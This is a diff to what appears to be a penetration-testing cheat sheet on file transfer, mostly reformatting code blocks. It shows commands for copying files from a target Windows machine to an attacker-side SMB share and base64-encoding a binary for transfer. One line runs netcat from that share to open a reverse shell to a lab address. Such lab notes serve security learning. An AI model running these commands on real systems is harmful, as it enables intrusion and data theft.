@@ -15,29 +15,40 @@ impacket-smbserver share . -smb2support
 
 #### cmd
 
-```cmd
+```powershell
 # Connect to SMB server without creds
 net use \\10.10.14.10\share
+```
 
+```powershell
 # Connect to SMB server with creds
 net use \\10.10.14.10\share /u:user password
+```
 
+```powershell
 # From target Windows to local Linux
 copy test.txt \\10.10.14.10\share
+```
 
+```powershell
 # From local Linux to target Windows
 copy \\10.10.14.10\share\test.txt test.txt
+```
 
+```powershell
 # Delete file
 del test.txt
+```
 
+```powershell
 # Remove SMB share
 net use /d \\10.13.14.10\share
+```
 
+```powershell
 # Older Windows (e.g., xp), use directly
 \\10.10.14.10\share\nc.exe -e cmd.exe 10.10.14.10 443
 ```
-
 
 <br>
 
@@ -48,7 +59,9 @@ net use /d \\10.13.14.10\share
 ```powershell
 # In target Windows
 [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\Tasks\test.exe' -Encoding Byte))
+```
 
+```bash
 # Copy and paste the base64 encoded binary to local Linux
 echo -n '<base64 encoded binary>' | base64 -d > test.exe
 ```
